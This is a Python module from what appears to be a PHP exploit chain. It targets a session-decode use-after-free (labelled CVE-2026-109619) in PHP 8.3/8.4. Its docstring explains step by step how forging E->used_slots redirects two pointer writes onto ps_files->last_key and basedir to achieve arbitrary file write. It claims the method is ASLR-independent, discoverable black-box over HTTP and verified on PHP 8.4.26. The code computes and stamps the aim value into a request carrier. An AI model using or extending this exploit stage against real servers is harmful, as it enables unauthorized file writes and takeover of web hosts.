#!/usr/bin/env python3
# INDEX: forge ps_files basedir for arbitrary file write | all | needs dangling BG decoder
"""The ps_files->basedir two-push forge: aim a dangling decode's two var_push()es at
ps_files->{last_key, basedir} (CVE-2026-109619 session-decode UAF -> file write).

Mechanism (ext/session/mod_files.c, Zend/zend_variables.c; php-src 8.3/8.4):
  A session decode that OOMs mid-php_var_unserialize skips PHP_VAR_UNSERIALIZE_DESTROY,
  leaving BG(unserialize) pointing at a freed var_entries (E) block. A later decode on the
  same worker re-occupies that block from a request-body carrier; forging E->used_slots makes
  var_tmp_var() index E->data[used_slots], so the decode's two pushes land where aimed. Aim them
  at ps_files->last_key and ps_files->basedir: push0 -> last_key forces a ps_files_open() REOPEN
  (basedir is consulted only on a reopen, keyed on last_key != key); push1 -> basedir points at a
  fake {len, path} the carrier supplies, so the next FILE_START s_write pwrites the session to that
  path. E and ps_files share the one 2 MB-aligned request chunk, so the aim is chunk-relative and
  ASLR-independent:  AIM = (ps_files - E - 0x10) / 8.

Forges only the aim cell (E->used_slots); the fake basedir backing's carrier offset is supplied
separately. A NUL in basedir->val truncates the written path to the attacker file.

AIM is EXACT, but a missed AIM is NON-CRASHING (two chunk-pointers land near ps_files, the worker
survives), so it is discoverable black-box over HTTP by sweeping candidates on one surviving worker.
Being chunk-relative (ASLR/memory_limit-invariant, fork-stable), the window is the cross-build spread.

API:
  aim_used_slots(ps_files_off, e_off) -> AIM (both chunk-relative offsets).
  aim_pushes(carrier, carrier_e_off, aim_u) -> stamp E->used_slots at carrier_e_off
    (= E_OFF - DT_OFF); mutates carrier in place.

Tested: 8.4.26-fpm, 8.4.26-apache mod_php.
Credit: kengwang, Calif Research.
Stage: VERIFIED 8.4.26.
"""
import struct


def aim_used_slots(ps_files_off, e_off):
    """The E->used_slots value that aims var_tmp_var's two pushes at
    ps_files->{last_key, basedir}: AIM = (ps_files - E - 0x10) / 8 (both chunk-relative)."""
    return (ps_files_off - e_off - 0x10) // 8


def aim_pushes(carrier, carrier_e_off, aim_u):
    """Stamp E->used_slots = `aim_u` into the carrier at `carrier_e_off` (= E_OFF - DT_OFF,
    where the re-occupied E block's used_slots field falls). Mutates `carrier` in place."""
    struct.pack_into("<q", carrier, carrier_e_off, aim_u)
    return carrier
